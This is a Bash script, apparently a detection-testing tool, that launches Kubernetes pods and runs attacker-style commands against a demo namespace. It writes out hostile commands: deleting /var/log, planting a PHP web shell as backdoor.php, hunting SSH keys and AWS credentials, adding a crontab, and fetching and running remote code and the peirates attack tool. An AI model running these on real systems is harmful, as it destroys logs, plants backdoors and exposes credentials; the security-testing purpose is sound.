#!/bin/bash

# Set strict error handling
set -eo pipefail

# Color definitions
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# Default variables
NAMESPACE="demo"
TARGET_APP="app-server-1"
VERBOSE=false
LOG_FILE="security-test-$(date +%Y%m%d-%H%M%S).log"
UBUNTU_VERSION="22.04"
COMMAND=""
TEST_TIMEOUT=30

# Help message
show_help() {
    cat << EOF
Advanced Security Testing Tool
Usage: ${0##*/} [OPTIONS] COMMAND

Options:
    -h, --help              Display this help message
    -n, --namespace NAME    Specify namespace (default: demo)
    -t, --target APP       Target application (default: app-server-1)
    -v, --verbose          Enable verbose output
    -tv, -vt               Combined verbose and target flags
    -l, --log FILE         Specify log file
    --no-color             Disable colored output

Available Commands:
  Basic Tests:
    info        - System information gathering
    discover    - Service discovery
    logs        - Log manipulation test
    files       - File operation test
    shell       - Interactive shell access
    compile     - Compiler installation test
    custom      - Execute custom command

  Security Tests:
    javatest    - Test Java application anomalies
    privtest    - Test privileged container execution
    webshell    - Test web shell detection
    ssh         - Test SSH lateral movement
    privesc     - Test privilege escalation
    credaccess  - Test credential access
    cronjob     - Test cronjob manipulation
    escape      - Test container escape detection
    exploit     - Test exploit script execution
    peirates    - Test peirates tool deployment
    full        - Run all tests

Examples:
    ${0##*/} -tv app-server-2 full
    ${0##*/} -v -t app-server-2 full
    ${0##*/} full -tv app-server-2
    ${0##*/} -n custom-namespace -tv app-server-2 full
    ${0##*/} -l custom.log -tv app-server-2 full
EOF
}

# Logging function
log() {
    local level=$1
    shift
    local message=$*
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    
    case $level in
        "INFO")  local color=$GREEN ;;
        "WARN")  local color=$YELLOW ;;
        "ERROR") local color=$RED ;;
        *)       local color=$NC ;;
    esac

    if [[ $VERBOSE == true ]]; then
        echo -e "${color}${timestamp} [${level}] ${message}${NC}" | tee -a "$LOG_FILE"
    else
        echo -e "${color}${timestamp} [${level}] ${message}${NC}" >> "$LOG_FILE"
    fi
}

# Function to check prerequisites
check_prerequisites() {
    log "INFO" "Checking prerequisites..."
    
    # Check kubectl
    if ! command -v kubectl &> /dev/null; then
        log "ERROR" "kubectl not found. Please install kubectl first."
        exit 1
    fi

    # Check if namespace exists
    if ! kubectl get namespace "$NAMESPACE" &> /dev/null; then
        log "ERROR" "Namespace $NAMESPACE does not exist"
        exit 1
    fi

    # Check if target service exists
    if ! kubectl get service -n "$NAMESPACE" --selector=app="$TARGET_APP" &> /dev/null; then
        log "ERROR" "Target service for $TARGET_APP not found in namespace $NAMESPACE"
        exit 1
    fi

    log "INFO" "Prerequisites check completed"
}

# Function to get target service IP
get_target_url() {
    local url
    url=$(kubectl get svc -n "$NAMESPACE" --selector=app="$TARGET_APP" -o jsonpath='{.items[*].spec.clusterIP}')
    if [[ -z "$url" ]]; then
        log "ERROR" "Failed to get target service IP"
        exit 1
    fi
    echo "http://$url"
}

# Execute test function with retry logic
execute_test() {
    local test_name=$1
    local command=$2
    local image=${3:-"toluid/a1"}
    local target_url=$(get_target_url)
    local max_retries=3
    local retry_count=0
    local result
    
    log "INFO" "Executing test: $test_name"
    log "INFO" "Using image: $image"
    
    while [ $retry_count -lt $max_retries ]; do
        local pod_name="tester-${RANDOM}"
        
        if [[ "$image" == "toluid/a1" ]]; then
            log "INFO" "Running test against target: $target_url"
            set +e
            result=$(kubectl run -n "$NAMESPACE" "$pod_name" --rm -i --image "$image" -- "$target_url" "$command" 2>&1) && break
            set -e
        else
            log "INFO" "Running generic container test"
            set +e
            result=$(kubectl run -n "$NAMESPACE" "$pod_name" --rm -i --image "$image" -- bash -c "$command" 2>&1) && break
            set -e
        fi
        
        ((retry_count++))
        log "WARN" "Attempt $retry_count failed, retrying..."
        sleep 2
    done

    if [ $retry_count -eq $max_retries ]; then
        log "ERROR" "Test failed after $max_retries attempts"
        return 1
    fi

    log "INFO" "Test completed: $test_name"
    if [[ -n "$result" ]]; then
        echo "Test output:" >> "$LOG_FILE"
        echo "$result" >> "$LOG_FILE"
        if [[ $VERBOSE == true ]]; then
            echo -e "${BLUE}Test output:${NC}"
            echo "$result"
        fi
    fi
}

# Basic test functions with combined commands
run_info_test() {
    log "INFO" "Running System Information Tests..."
    
    local cmds=(
        "whoami && uname -a && id"    # Original system info
        "whoami"                      # Additional simple user check
    )
    
    for cmd in "${cmds[@]}"; do
        execute_test "System Information" "$cmd"
        sleep 2
    done
}

run_discover_test() {
    log "INFO" "Running Service Discovery Tests..."
    
    local cmds=(
        "ps aux && netstat -tulpn 2>/dev/null"   # Original network check
        "service --status-all && ps -aux"         # Additional service check
    )
    
    for cmd in "${cmds[@]}"; do
        execute_test "Service Discovery" "$cmd"
        sleep 2
    done
}

run_logs_test() {
    log "INFO" "Running Log Analysis Tests..."
    
    local cmds=(
        "ls -la /var/log"                                                # Show current logs
        "ls -lah /var/log && tail -n 5 /var/log/*/* 2>/dev/null"       # Detailed log check
        "rm -rf /var/log"                                               # Delete logs
        "ls -lah /var/log"                                              # Verify deletion
    )
    
    for cmd in "${cmds[@]}"; do
        execute_test "Log Analysis" "$cmd"
        sleep 2
    done
}

run_files_test() {
    log "INFO" "Running File Operation Tests..."
    
    local cmds=(
        "ls -lah /tmp"                                           # Show current files
        "find / -type f -perm -4000 2>/dev/null"                # Find SUID files
    )
    
    for cmd in "${cmds[@]}"; do
        execute_test "File Operations" "$cmd"
        sleep 2
    done
}

run_shell_test() {
    log "INFO" "Starting interactive shell"
    kubectl run "shell-${RANDOM}" -n "$NAMESPACE" --rm -it --image "ubuntu:$UBUNTU_VERSION" -- bash
}

run_compile_test() {
    local compile_script="apt-get update > /dev/null 2>&1 && \
                         apt-get install -y gcc wget > /dev/null 2>&1 && \
                         wget -q https://raw.githubusercontent.com/SoOM3a/c-hello-world/master/hello.c && \
                         gcc hello.c && ./a.out"
    execute_test "Compiler Test" "$compile_script" "ubuntu:$UBUNTU_VERSION"
}

run_custom_test() {
    read -p "Enter command to execute: " cmd
    execute_test "Custom Command" "$cmd"
}

# Advanced test functions
run_java_anomaly_test() {
    local cmd="apt-get update > /dev/null && \
               apt-get install -y default-jdk wget > /dev/null && \
               wget -q https://raw.githubusercontent.com/SoOM3a/c-hello-world/master/JavaBash.java && \
               javac JavaBash.java && \
               java Main"
    execute_test "Java Application Anomaly" "$cmd" "ubuntu:$UBUNTU_VERSION"
}

run_privileged_test() {
    log "INFO" "Starting privileged container test..."
    kubectl run "priv-test-${RANDOM}" -n "$NAMESPACE" --rm -i --privileged --image=ubuntu:$UBUNTU_VERSION -- bash -c "echo 'Hi DemoTest'"
}

run_webshell_test() {
    local cmd="mkdir -p /var/www/html && \
               echo '<?php system(\$_GET[\"cmd\"]); ?>' > /var/www/html/backdoor.php && \
               apt-get update > /dev/null && \
               apt-get install -y curl net-tools iputils-ping > /dev/null && \
               ping -c 1 8.8.8.8 && \
               curl -s www.google.com"
    execute_test "Web Shell Detection" "$cmd" "ubuntu:$UBUNTU_VERSION"
}

run_ssh_lateral_test() {
    local cmd="apt-get update > /dev/null && \
               apt-get install -y ssh > /dev/null && \
               cat /root/.ssh/authorized_keys 2>/dev/null; \
               find / -name id_rsa.pub 2>/dev/null; \
               ssh -V"
    execute_test "SSH Lateral Movement" "$cmd" "ubuntu:$UBUNTU_VERSION"
}

run_privesc_test() {
    local cmd="apt-get update > /dev/null && \
               apt-get install -y strace policykit-1 > /dev/null && \
               strace whoami 2>&1; \
               which pkexec; \
               which sudoedit"
    execute_test "Privilege Escalation" "$cmd" "ubuntu:$UBUNTU_VERSION"
}

run_cred_access_test() {
    local cmd="cat /root/.ssh/authorized_keys 2>/dev/null; \
               find / -name 'aws/credentials' 2>/dev/null; \
               find / -name id_rsa.pub 2>/dev/null"
    execute_test "Credential Access" "$cmd" "ubuntu:$UBUNTU_VERSION"
}

run_cronjob_test() {
    local cmd="apt-get update > /dev/null && \
               apt-get install -y cron > /dev/null && \
               (crontab -l || true) && \
               echo '* * * * * /usr/bin/touch /tmp/test' | crontab - && \
               crontab -l"
    execute_test "Cronjob Manipulation" "$cmd" "ubuntu:$UBUNTU_VERSION"
}

run_container_escape_test() {
    local cmd="curl -fsSL https://github.com/genuinetools/amicontained/releases/download/v0.4.9/amicontained-linux-amd64 -o /usr/local/bin/amicontained && \
               chmod +x /usr/local/bin/amicontained && \
               /usr/local/bin/amicontained"
    execute_test "Container Escape Test" "$cmd" "ubuntu:$UBUNTU_VERSION"
}

run_exploit_test() {
    local cmd="touch exploit.sh && \
               echo '#!/bin/bash' > exploit.sh && \
               echo 'whoami' >> exploit.sh && \
               echo 'id' >> exploit.sh && \
               echo 'hostname' >> exploit.sh && \
               echo 'mount' >> exploit.sh && \
               chmod a+x exploit.sh && \
               ./exploit.sh"
    execute_test "Exploit Script Test" "$cmd" "ubuntu:$UBUNTU_VERSION"
}

run_peirates_test() {
    local cmd="apt-get update > /dev/null && \
               apt-get install -y git curl > /dev/null && \
               git clone https://github.com/inguardians/peirates.git /tmp/peirates 2>/dev/null || true && \
               ls -la /tmp/peirates"
    execute_test "Peirates Tool Test" "$cmd" "ubuntu:$UBUNTU_VERSION"
}

# Full test suite with continuation on failure
run_full_test() {
    log "INFO" "Starting full system test"
    local failed_tests=()
    
    run_test_safely() {
        local test_name=$1
        local test_func=$2
        
        log "INFO" "Running: $test_name"
        if $test_func; then
            log "INFO" "✅ $test_name completed successfully"
        else
            log "WARN" "❌ $test_name failed but continuing with remaining tests"
            failed_tests+=("$test_name")
        fi
        sleep 2
    }

    # Run all tests
    run_test_safely "Information Gathering" run_info_test
    run_test_safely "Service Discovery" run_discover_test
    run_test_safely "Log Analysis" run_logs_test
    run_test_safely "File Operations" run_files_test
    run_test_safely "Java Application Test" run_java_anomaly_test
    run_test_safely "Web Shell Detection" run_webshell_test
    run_test_safely "SSH Lateral Movement" run_ssh_lateral_test
    run_test_safely "Privilege Escalation" run_privesc_test
    run_test_safely "Credential Access" run_cred_access_test
    run_test_safely "Container Escape" run_container_escape_test
    run_test_safely "Exploit Execution" run_exploit_test
    run_test_safely "Peirates Tool" run_peirates_test

    # Summary report
    log "INFO" "Full system test completed"
    if [ ${#failed_tests[@]} -eq 0 ]; then
        log "INFO" "All tests completed successfully! 🎉"
    else
        log "WARN" "The following tests failed:"
        for test in "${failed_tests[@]}"; do
            log "WARN" "  - $test"
        done
    fi
}

# Parse command line arguments
parse_args() {
    while [[ $# -gt 0 ]]; do
        case $1 in
            -h|--help)
                show_help
                exit 0
                ;;
            -tv|-vt)
                VERBOSE=true
                if [[ -n "$2" && "$2" =~ ^app- ]]; then
                    TARGET_APP="$2"
                    shift
                fi
                ;;
            -v|--verbose)
                VERBOSE=true
                if [[ -n "$2" && "$2" =~ ^app- ]]; then
                    TARGET_APP="$2"
                    shift
                fi
                ;;
            -t|--target)
                if [[ -n "$2" && "$2" =~ ^app- ]]; then
                    TARGET_APP="$2"
                    shift
                fi
                ;;
            -n|--namespace)
                NAMESPACE="$2"
                shift
                ;;
            -l|--log)
                LOG_FILE="$2"
                shift
                ;;
            --no-color)
                RED=''
                GREEN=''
                YELLOW=''
                BLUE=''
                NC=''
                ;;
            app-*)
                TARGET_APP="$1"
                ;;
            info|discover|logs|files|shell|compile|custom|javatest|privtest|webshell|ssh|privesc|credaccess|cronjob|escape|exploit|peirates|full)
                COMMAND="$1"
                ;;
            *)
                if [[ "$1" =~ ^- ]]; then
                    echo "Unknown option: $1"
                    show_help
                    exit 1
                fi
                ;;
        esac
        shift
    done

    if [[ -z "$COMMAND" ]]; then
        echo "No command specified"
        show_help
        exit 1
    fi
}

# Main execution
main() {
    parse_args "$@"
    
    log "INFO" "Starting security test with command: $COMMAND"
    log "INFO" "Target: $TARGET_APP"
    log "INFO" "Namespace: $NAMESPACE"
    
    check_prerequisites
    
    case "$COMMAND" in
        info)        run_info_test ;;
        discover)    run_discover_test ;;
        logs)        run_logs_test ;;
        files)       run_files_test ;;
        shell)       run_shell_test ;;
        compile)     run_compile_test ;;
        custom)      run_custom_test ;;
        javatest)    run_java_anomaly_test ;;
        privtest)    run_privileged_test ;;
        webshell)    run_webshell_test ;;
        ssh)         run_ssh_lateral_test ;;
        privesc)     run_privesc_test ;;
        credaccess)  run_cred_access_test ;;
        cronjob)     run_cronjob_test ;;
        escape)      run_container_escape_test ;;
        exploit)     run_exploit_test ;;
        peirates)    run_peirates_test ;;
        full)        run_full_test ;;
        *)        
            echo "Unknown command: $COMMAND"
            show_help
            exit 1
            ;;
    esac
}

# Execute main
main "$@"
